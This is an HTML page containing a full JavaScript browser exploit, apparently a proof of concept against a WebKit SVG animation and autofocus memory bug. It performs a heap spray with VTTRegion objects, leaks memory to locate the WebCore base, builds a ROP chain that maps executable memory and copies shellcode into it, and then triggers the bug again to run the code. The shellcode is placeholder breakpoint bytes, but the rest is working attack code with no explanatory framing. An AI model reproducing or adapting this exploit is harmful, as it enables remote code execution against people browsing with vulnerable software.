<body>
    <svg id="svgRoot1">
       <line id="line1" stroke-dasharray="1" x1="0" y1="0" x2="0" y2="0">
       <animate id="animate1" attributeName="stroke-miterlimit" from="1" to="1" dur="1000s" />
       </line>
    </svg>
    <svg id="svgRoot2">
       <line id="line2" stroke-dasharray="1" x1="0" y1="0" x2="0" y2="0">
       <animate id="animate2" attributeName="stroke-dasharray" from="1" to="1" />
       </line>
    </svg>
    <div id="inputParent">
    <input id="input1" onfocusin="onFoucsIn1()">
    <input id="input2" onfocusin="onFoucsIn2()">
    <input id="input3" onfocusin="onFoucsIn2()">
    <input id="input4" onfocusin="onFoucsIn2()">
    <input id="input5" onfocusin="onFoucsIn2()">
    <input id="input6" onfocusin="onFoucsIn2()">
    </div>
    <button onclick="go()">go</button>
    <script>
    
      var shellcode = unescape("%uCCCC%uCCCC%uCCCC%uCCCC%uCCCC%uCCCC%uCCCC%uCCCC");
    
      var fptroffset = 0x14a65c0;
    
      var webcore = 0;
    
      // computes absolute addresses of ROP chain elements
      // using base address of webcore + offset
      function getRopArr() {
        return [
          webcore + 0x36cb, // (pop pop pop ret)
          0,
          webcore + 0x2c7aa5, // (push rax; mov rax, [rsi], call [rax+0x28])
          0,
          webcore + 0x36ce, // (pop ret)
          webcore + 0xb91a5c, // (pop rbp; sal; pop rsp; ret) alternate 0x13eee57
          webcore + 0x63c69d, // (pop rdi; ret)
          0,
          webcore + 0xc8e4e, // (pop rsi, ret)
          shellcode.length * 2,
          webcore + 0xb3036, // (pop rdx; ret)
          0x7, // (prot_exec + prot_read + prot_write)
          webcore + 0x51bd3, // (pop rcx; ret)
          0x1002, // (MAP_ANON, MAP_PRIVATE)
          webcore + 0x33516, // (pop r8; pop rbp; ret)
          0xffffffff, // (-1)
          0,
          webcore + 0x9569ad, // (pop r9; ret)
          0,
          webcore + 0x158c95e, // (mmap)
          webcore + 0xfacd5a, // (push rax; pop rdi; ret)
          webcore + 0x26426, // (push rsp; pop rbp; ret)
          webcore + 0x955833, // (push rbp; pop rax; ret)
          webcore + 0x13e46d, // (add rax, 0x50; pop rbp; ret)
          0,
          webcore + 0xa890, // (push rax; pop rsi; pop rbp; ret)
          0,
          webcore + 0xb3036, // (pop rdx; ret)
          shellcode.length * 2,
          webcore + 0x158c916, // (memcpy)
          webcore + 0x301c79, // (jmp rax)
          0 ];
      }
    
      // returns ROP chain + shellcode as string
      function getPayload() {
        payload = "";
        roparr = getRopArr();
        for(var i=0; i<roparr.length; i++) {
          payload += numToStr(roparr[i]);
        }
        payload += shellcode;
    
        // round up to page size
        var fill = 0x1000 - (payload.length * 2 + 0x40) % 0x1000;
        payload += String.fromCharCode(0xCCCC).repeat(fill/2);
    
        return payload;
      }
    
      // converts a number into an ecquivalent string representation
      function numToStr(num) {
        var part1 = num % 0x10000;
        num /= 0x10000;
        var part2 = num % 0x10000;
        num /= 0x10000;
        var part3 = num % 0x10000;
        num /= 0x10000;
        var part4 = num % 0x10000;
        return String.fromCharCode(part1, part2, part3, part4);
      }
    
      // breaks a number into single byte parts
      function addrToArr(num) {
        var arr = new Array(8);
        for(var i=0; i<8; i++) {
          arr[i] = num % 0x100;
          num /= 0x100;
        }
        return arr;
      }
    
      // returns integer representation of a float number
      function float2int(f) {
        var buffer = new ArrayBuffer(4);
        var view = new DataView(buffer);
        view.setFloat32(0, f);
        return view.getUint32(0);
      }
    
      // returns float representation of an int
      function int2float(f) {
        var buffer = new ArrayBuffer(4);
        var view = new DataView(buffer);
        view.setUint32(0, f);
        return view.getFloat32(0);
      }
    
    
      var property1 = '';
      var property2 = '';
      var payloadaddr;
    
      var spray = [];
      var guardarr = [];
    
      var offset = 0xf1111128;
    
      var lower;
      var numfail = 0;
      var numfail2 = 0;
    
      var execattempt = 0;
      
      var ropaddrarr;
    
      function onFoucsIn1() {
        // prompt('in handler');
        document.getElementById('animate1').setAttribute('attributeName',property1);
      }
    
      function onFoucsIn2() {
        //prompt('in handler');
        var buffer = new ArrayBuffer(0x28 * 3);
        var arr8 = new Uint8Array(buffer, 0, 0x28);
        var arr16 = new Uint16Array(buffer, 0x28, 0x28);
        for(var i=0;i<0x28;i++) {
          // arr16[i]=0x41;
          arr16[i]=0x41;
        }
        for(var i=0;i<0x8;i++) {
          arr16[i] = ropaddrarr[i];
        }
        document.getElementById('animate2').setAttribute('attributeName','stroke-dasharray');
        for(var i=0;i<1000000;i++) {
          arr8.set(arr16);
        } 
     }
    
      // sets the offset to read from
      function setReadOffset(o) {
        document.getElementById('animate1').setAttribute('from', int2float(o));
        document.getElementById('animate1').setAttribute('to', int2float(o));
      }
    
      // read the value at offset set via setReadOffset() 
      function readValue() {
        var value = window.getComputedStyle(document.getElementById("line1")).getPropertyValue(property1);
        return float2int(Number(value.trim().replace('px','')));
      }
    
      function go() {
        property1 = 'stroke-miterlimit'
        property2 = 'stroke-dasharray'
    
        alert('spray start');
    
        for(var i=0;i<(100000);i++) {
          guardarr[i] = document.createElement('details');
        }
        for(var i=0;i<(100000);i++) {
          if(i%100 != 0) guardarr[i] = 0;
        }
        for(var i=0;i<(50000);i++) {
          guardarr[0] = document.createElement('details');
        }
    
        // heap spray with VTTRegion objects    
        spray = new Array(10000);
        for(var i=0;i<10000;i++) {
          spray[i] = new Array(1000);
          for(var j=0;j<1000;j++) {
            spray[i][j] = new VTTRegion();
            spray[i][j].height = i*1000+j;
          }
        }
    
        alert('spray done');
    
        setReadOffset(offset);
    
        var input = document.getElementById('input1');
    
        // trigger the bug the 1st time
        // onFoucsIn1 gets called
        input.autofocus = true;
        inputParent.after(inputParent);
        document.getElementById('animate1').setAttribute('attributeName', property2);
        document.getElementById('svgRoot1').setCurrentTime(1);
    
        input.autofocus = false;
    
        setTimeout(readmem1, 100);
      }
    
      // search the memory for a function pointer, read lower 32 bits of it
      function readmem1() {
        value = readValue();
    
        if(value != 0 && value != 0x3f800000) {
          lower = value;
          //prompt(value.toString(16));
          setReadOffset(offset + 4);
          setTimeout(readmem2, 10);
          return;
        }
    
        numfail++;
        if(numfail>20) {
          //alert('fail');
          numfail2++;
          if(numfail2 > 10) {
            alert('exploit failed. not vulnerable?');
            return;
          }
          offset -= 0x10000000;
          numfail = 0;
        } else {
          offset += 0x1000;
        }
        setReadOffset(offset);
        setTimeout(readmem1, 10);
    
      }
    
      // read higher 32 bits of a function pointer and verify that it's 0x7fff
      function readmem2() {
        value = readValue();
    
        if(value!=0x7fff) {
          numfail++;
          if(numfail>20) {
            //alert('fail');
            numfail2++;
            if(numfail2 > 10) {
              alert('exploit failed. not vulnerable?');
              return;
            }
            offset -= 0x10000000;
            numfail = 0;
          } else {
            offset += 0x1000;
          }
          setReadOffset(offset);
          setTimeout(readmem1, 10);
          return;
        }
    
        webcore = 0x7fff00000000 + lower - fptroffset;
        webcore = Math.round(webcore/0x1000) * 0x1000;
        alert('webcore found at ' + webcore.toString(16));
    
        offset = offset - 0x1128 + 0x40;
        setReadOffset(offset);
        setTimeout(readmem3, 10);
      }
    
      // search the memory for a VTTRegion object
      function readmem3() {
        value = readValue();
    
        if(value == 0x42c80000) {
          alert('VTTRegion object found');
          offset -= 0x10;
          setReadOffset(offset);
          setTimeout(readmem4, 10);
          return;
        }
    
        offset -= 0x1000;
        setReadOffset(offset);
        setTimeout(readmem3, 10);
    
      }
    
      // read the index of a VTTRegion object
      function readmem4() {
        value = readValue();
    
        var i = Math.floor(value / 1000);
        var j = value % 1000;
    
        var from = j - 0x20;
        if(from < 0) from = 0;
        var to = j + 0x20;
        if(to > 1000) to = 1000;
        var payload = getPayload();
        for(j = from; j<to; j++) {
          spray[i][j].id = payload + String.fromCharCode(j);
        }
    
        alert('VTTRegion index: ' + value);
    
        offset -= 0x17;
        setReadOffset(offset);
        setTimeout(readmem5, 10);
      }
    
      // read the 'id' string pointer of a VTTRegion object
      function readmem5() {
        value = readValue();
    
        document.getElementById('animate1').setAttribute('attributeName', property1);
        document.getElementById('svgRoot1').setCurrentTime(1);
    
        //alert(value.toString(16) + ' ' + offset.toString(16));
    
        payloadaddr = Math.round(value / 0x10) * 0x1000 + 0x18;
    
        alert("payload found at: " + payloadaddr.toString(16));
    
        ropaddrarr = addrToArr(payloadaddr);
    
        setTimeout(exec, 100);
      }
    
      function exec() {
        alert('attempting code exec');
    
        var input = document.getElementById('input' + (execattempt + 2));
    
        for(var i=0;i<10000;i++) {
          document.getElementById('animate2').setAttribute('attributeName', 'stroke-dasharray');
          document.getElementById('svgRoot2').setCurrentTime(1);
        }
    
        // trigger the bug the 2nd time.
        // onFoucsIn2 gets called. 
        input.autofocus = true;
        inputParent.after(inputParent);    
        document.getElementById('animate2').setAttribute('attributeName', 'stroke-dasharray');
        document.getElementById('svgRoot2').setCurrentTime(1);
    
        input.autofocus = false;
    
        execattempt++;
        if(execattempt >= 5) {
          alert('code exec failed');
        } else {
          setTimeout(exec, 100);
        }
      }
    
    </script>
</body>